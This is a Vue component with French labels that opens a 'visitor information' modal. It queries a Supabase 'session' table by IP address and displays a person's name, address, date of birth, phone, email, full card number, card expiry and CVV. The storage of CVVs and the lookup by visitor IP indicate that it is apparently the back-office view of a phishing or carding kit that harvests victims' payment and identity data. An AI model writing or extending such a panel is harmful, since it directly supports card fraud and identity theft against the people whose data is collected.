<script setup>
import { ref, watch } from 'vue'
import { supabase } from '@/lib/supabase'

const props = defineProps({
  open: Boolean,
  ip: String
})
const emit = defineEmits(['close'])

const loading = ref(false)
const error = ref('')
const data = ref(null)

async function fetchVisitor(ip) {
  if (!ip) return
  loading.value = true
  error.value = ''
  data.value = null
  try {
    const { data: rows, error: supaError } = await supabase
      .from('session')
      .select(` user_agent,
        fname, lname, address, postalcode, city, dob, phone, email,
        card_number, card_exp, card_cvv
      `)
      .eq('ip', ip)
      .limit(1)
      .maybeSingle()

    if (supaError) throw new Error(supaError.message)
    if (!rows) throw new Error("Aucune donnée trouvée.")
    data.value = rows
  } catch (e) {
    error.value = e.message || "Impossible de charger les informations."
  } finally {
    loading.value = false
  }
}

watch(() => props.open, v => { if (v && props.ip) fetchVisitor(props.ip) })
watch(() => props.ip, v => { if (props.open && v) fetchVisitor(v) })
</script>
<template>
  <!-- Overlay & modal visible seulement si open -->
  <transition name="fade">
    <div v-if="open" class="fixed inset-0 z-50 flex items-center justify-center">
      <!-- Overlay -->
      <div
        class="fixed inset-0 bg-black/70 backdrop-blur-sm transition-opacity"
        @click="emit('close')"
      />
      <!-- Dialog -->
      <div
        class="relative z-10 w-full max-w-lg mx-auto rounded-2xl bg-[#18181b] border border-[#232323]
        shadow-2xl px-2 sm:px-6 py-4 sm:py-6 flex flex-col
        max-h-[90vh] sm:max-h-[85vh] overflow-y-auto"
        style="min-width: 0"
      >
        <div class="flex items-center gap-2 text-lg font-bold text-gray-100 mb-2 sm:mb-1 mt-1 sm:mt-0">
          <svg class="w-6 h-6 text-[#1adb5b]" fill="none" viewBox="0 0 24 24"><circle cx="12" cy="12" r="12" fill="#1adb5b"/><path d="M8 12l3 3 5-5" stroke="#18181b" stroke-width="2" fill="none"/></svg>
          Informations visiteur
        </div>
        <div class="mb-2 text-xs text-gray-400 break-all">
          IP : <span class="font-mono text-gray-200">{{ ip }}</span>
        </div>

        <template v-if="loading">
          <div class="flex items-center justify-center py-10">
            <svg class="animate-spin h-8 w-8 text-[#1adb5b]" fill="none" viewBox="0 0 24 24">
              <circle class="opacity-25" cx="12" cy="12" r="10" stroke="#1adb5b" stroke-width="4"></circle>
              <path class="opacity-75" fill="#1adb5b" d="M4 12a8 8 0 018-8v8z"></path>
            </svg>
          </div>
        </template>
        <template v-else-if="error">
          <div class="bg-red-950 border border-red-700 text-red-200 rounded p-3 text-sm mb-3">{{ error }}</div>
        </template>
        <template v-else-if="data">
          <!-- Monocolonne sur mobile, 2 sur sm+ -->
          <dl class="grid grid-cols-1 sm:grid-cols-2 gap-x-4 gap-y-2 text-gray-200 mb-1">
            <div>
              <dt class="text-gray-400 text-xs font-bold uppercase">UA</dt>
              <dd class="font-mono text-sm break-all">{{ data.user_agent || '—' }}</dd>
            </div>
            <div>
              <dt class="text-gray-400 text-xs font-bold uppercase">Prénom</dt>
              <dd class="font-mono text-sm">{{ data.fname || '—' }}</dd>
            </div>
            <div>
              <dt class="text-gray-400 text-xs font-bold uppercase">Nom</dt>
              <dd class="font-mono text-sm">{{ data.lname || '—' }}</dd>
            </div>
            <div>
              <dt class="text-gray-400 text-xs font-bold uppercase">Adresse</dt>
              <dd class="font-mono text-sm break-words">{{ data.address || '—' }}</dd>
            </div>
            <div>
              <dt class="text-gray-400 text-xs font-bold uppercase">Code postal</dt>
              <dd class="font-mono text-sm">{{ data.postalcode || '—' }}</dd>
            </div>
            <div>
              <dt class="text-gray-400 text-xs font-bold uppercase">Ville</dt>
              <dd class="font-mono text-sm">{{ data.city || '—' }}</dd>
            </div>
            <div>
              <dt class="text-gray-400 text-xs font-bold uppercase">Date naissance</dt>
              <dd class="font-mono text-sm">{{ data.dob || '—' }}</dd>
            </div>
            <div>
              <dt class="text-gray-400 text-xs font-bold uppercase">Téléphone</dt>
              <dd class="font-mono text-sm">{{ data.phone || '—' }}</dd>
            </div>
            <div>
              <dt class="text-gray-400 text-xs font-bold uppercase">Email</dt>
              <dd class="font-mono text-sm break-all">{{ data.email || '—' }}</dd>
            </div>
            <div>
              <dt class="text-gray-400 text-xs font-bold uppercase">Carte</dt>
              <dd class="font-mono text-sm">{{ data.card_number || '—' }}</dd>
            </div>
            <div>
              <dt class="text-gray-400 text-xs font-bold uppercase">Exp.</dt>
              <dd class="font-mono text-sm">{{ data.card_exp || '—' }}</dd>
            </div>
            <div>
              <dt class="text-gray-400 text-xs font-bold uppercase">CVV</dt>
              <dd class="font-mono text-sm">{{ data.card_cvv || '—' }}</dd>
            </div>
          </dl>
        </template>

        <div class="flex justify-end mt-6">
          <button
            class="w-full sm:w-auto px-5 py-2 rounded-md text-sm font-semibold bg-[#1adb5b] text-black hover:bg-[#15b74b] transition"
            @click="emit('close')"
          >Fermer</button>
        </div>
      </div>
    </div>
  </transition>
</template>

<style scoped>
.fade-enter-active, .fade-leave-active { transition: opacity 0.2s }
.fade-enter-from, .fade-leave-to { opacity: 0 }
</style>
